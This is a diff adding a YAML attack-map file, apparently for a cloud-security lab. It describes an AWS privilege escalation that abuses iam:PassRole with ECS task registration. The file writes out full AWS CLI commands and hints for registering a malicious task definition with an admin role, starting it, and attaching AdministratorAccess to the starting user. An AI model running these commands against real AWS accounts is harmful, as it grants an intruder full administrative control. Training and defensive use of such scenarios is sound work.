@@ -1,0 +1,89 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-005-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole permission on the admin target role, along with
+        ecs:RegisterTaskDefinition and ecs:StartTask permissions. This combination allows
+        you to register a malicious ECS task definition using the admin role and execute
+        it on the ECS cluster's EC2 container instances.
+
+    - id: ecs-task-definition
+      label: "ECS Task Definition"
+      type: resource
+      subType: ecs-task
+      arn: "arn:aws:ecs:{region}:{account_id}:task-definition/pl-prod-ecs-005-privesc-task"
+      description: >
+        A malicious ECS task definition registered by the attacker. It specifies the
+        admin target role as the task execution role and includes a container command
+        that attaches AdministratorAccess to the starting user. When started on an
+        EC2 container instance, the task runs with the admin role's temporary credentials.
+
+    - id: target-role
+      label: "Admin Target Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-005-to-admin-target-role"
+      description: >
+        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. When
+        passed to the ECS task definition and executed on an EC2 container instance, the
+        task receives temporary credentials for this role. The task then uses those
+        credentials to attach AdministratorAccess directly to the starting user, completing
+        the privilege escalation.
+
+  edges:
+    - from: starting-principal
+      to: ecs-task-definition
+      label: "iam:PassRole + ecs:RegisterTaskDefinition"
+      description: >
+        The starting user passes the admin target role to a new ECS task definition.
+        The task definition contains a containerized AWS CLI command that will attach
+        AdministratorAccess to the starting user when executed.
+      hints:
+        - "You can pass IAM roles to ECS tasks and control what those tasks execute."
+        - "Look for admin roles trusted by ecs-tasks.amazonaws.com that you can pass."
+        - "Register a task definition with the admin role and a container that modifies IAM permissions, then start the task on a cluster instance."
+        - "Browse to https://pathfinding.cloud/paths/ecs-005 for technique details."
+      commands:
+        - description: "Register a malicious ECS task definition using the admin role"
+          command: >
+            aws ecs register-task-definition
+            --family pl-prod-ecs-005-privesc-task
+            --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-005-to-admin-target-role
+            --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-005-to-admin-target-role
+            --network-mode bridge
+            --container-definitions '[{"name":"privesc","image":"amazon/aws-cli","command":["iam","attach-user-policy","--user-name","pl-prod-ecs-005-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'
+
+    - from: ecs-task-definition
+      to: target-role
+      label: "ecs:StartTask"
+      description: >
+        The starting user launches the malicious task definition on an EC2 container
+        instance in the ECS cluster. The task executes with the admin role's temporary
+        credentials and attaches AdministratorAccess to the starting user, completing
+        the privilege escalation.
+      hints:
+        - "The task definition references the admin role — this is what provides elevated credentials at runtime."
+        - "The container command inside the task definition is what performs the IAM policy attachment."
+      commands:
+        - description: "List container instances in the cluster to find a target"
+          command: "aws ecs list-container-instances --cluster pl-prod-ecs-005-cluster"
+        - description: "Start the malicious task on the container instance"
+          command: >
+            aws ecs start-task
+            --cluster pl-prod-ecs-005-cluster
+            --task-definition pl-prod-ecs-005-privesc-task
+            --container-instances <CONTAINER_INSTANCE_ARN>
+        - description: "Verify privilege escalation by listing attached policies"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-ecs-005-to-admin-starting-user"
